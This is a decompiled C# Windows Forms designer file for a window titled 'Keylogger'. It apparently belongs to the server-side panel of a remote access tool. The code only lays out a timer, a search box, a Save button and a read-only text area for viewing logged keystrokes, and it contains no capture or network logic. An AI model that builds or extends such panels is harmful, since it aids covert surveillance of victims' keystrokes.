namespace Server.Forms
{
	// Token: 0x0200008D RID: 141
	public partial class FormKeylogger : global::System.Windows.Forms.Form
	{
		// Token: 0x060003DA RID: 986 RVA: 0x00004110 File Offset: 0x00002310
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x060003DB RID: 987 RVA: 0x0002FE68 File Offset: 0x0002E068
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Server.Forms.FormKeylogger));
			this.timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.toolStrip1 = new global::System.Windows.Forms.ToolStrip();
			this.toolStripLabel1 = new global::System.Windows.Forms.ToolStripLabel();
			this.toolStripTextBox1 = new global::System.Windows.Forms.ToolStripTextBox();
			this.toolStripSeparator1 = new global::System.Windows.Forms.ToolStripSeparator();
			this.toolStripButton1 = new global::System.Windows.Forms.ToolStripButton();
			this.richTextBox1 = new global::System.Windows.Forms.RichTextBox();
			this.toolStrip1.SuspendLayout();
			base.SuspendLayout();
			this.timer1.Interval = 1000;
			this.timer1.Tick += new global::System.EventHandler(this.Timer1_Tick);
			this.toolStrip1.ImageScalingSize = new global::System.Drawing.Size(24, 24);
			this.toolStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.toolStripLabel1,
				this.toolStripTextBox1,
				this.toolStripSeparator1,
				this.toolStripButton1
			});
			this.toolStrip1.Location = new global::System.Drawing.Point(0, 0);
			this.toolStrip1.Name = "toolStrip1";
			this.toolStrip1.Size = new global::System.Drawing.Size(487, 25);
			this.toolStrip1.TabIndex = 0;
			this.toolStrip1.Text = "toolStrip1";
			this.toolStripLabel1.Name = "toolStripLabel1";
			this.toolStripLabel1.Size = new global::System.Drawing.Size(42, 22);
			this.toolStripLabel1.Text = "Search";
			this.toolStripTextBox1.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.toolStripTextBox1.Name = "toolStripTextBox1";
			this.toolStripTextBox1.Size = new global::System.Drawing.Size(68, 25);
			this.toolStripTextBox1.Text = "...";
			this.toolStripTextBox1.KeyDown += new global::System.Windows.Forms.KeyEventHandler(this.ToolStripTextBox1_KeyDown);
			this.toolStripSeparator1.Name = "toolStripSeparator1";
			this.toolStripSeparator1.Size = new global::System.Drawing.Size(6, 25);
			this.toolStripButton1.DisplayStyle = global::System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			//this.toolStripButton1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("toolStripButton1.Image");
			this.toolStripButton1.ImageTransparentColor = global::System.Drawing.Color.Magenta;
			this.toolStripButton1.Name = "toolStripButton1";
			this.toolStripButton1.Size = new global::System.Drawing.Size(35, 22);
			this.toolStripButton1.Text = "Save";
			this.toolStripButton1.Click += new global::System.EventHandler(this.ToolStripButton1_Click);
			this.richTextBox1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.richTextBox1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.richTextBox1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.richTextBox1.Location = new global::System.Drawing.Point(0, 25);
			this.richTextBox1.Margin = new global::System.Windows.Forms.Padding(2, 2, 2, 2);
			this.richTextBox1.Name = "richTextBox1";
			this.richTextBox1.ReadOnly = true;
			this.richTextBox1.Size = new global::System.Drawing.Size(487, 241);
			this.richTextBox1.TabIndex = 1;
			this.richTextBox1.Text = "";
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(487, 266);
			base.Controls.Add(this.richTextBox1);
			base.Controls.Add(this.toolStrip1);
			//base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			base.Margin = new global::System.Windows.Forms.Padding(2, 2, 2, 2);
			base.Name = "FormKeylogger";
			this.Text = "Keylogger";
			base.FormClosed += new global::System.Windows.Forms.FormClosedEventHandler(this.Keylogger_FormClosed);
			base.Load += new global::System.EventHandler(this.FormKeylogger_Load);
			this.toolStrip1.ResumeLayout(false);
			this.toolStrip1.PerformLayout();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000324 RID: 804
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000325 RID: 805
		private global::System.Windows.Forms.ToolStrip toolStrip1;

		// Token: 0x04000326 RID: 806
		private global::System.Windows.Forms.ToolStripLabel toolStripLabel1;

		// Token: 0x04000327 RID: 807
		private global::System.Windows.Forms.ToolStripTextBox toolStripTextBox1;

		// Token: 0x04000328 RID: 808
		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator1;

		// Token: 0x04000329 RID: 809
		private global::System.Windows.Forms.ToolStripButton toolStripButton1;

		// Token: 0x0400032A RID: 810
		public global::System.Windows.Forms.RichTextBox richTextBox1;

		// Token: 0x0400032B RID: 811
		public global::System.Windows.Forms.Timer timer1;
	}
}
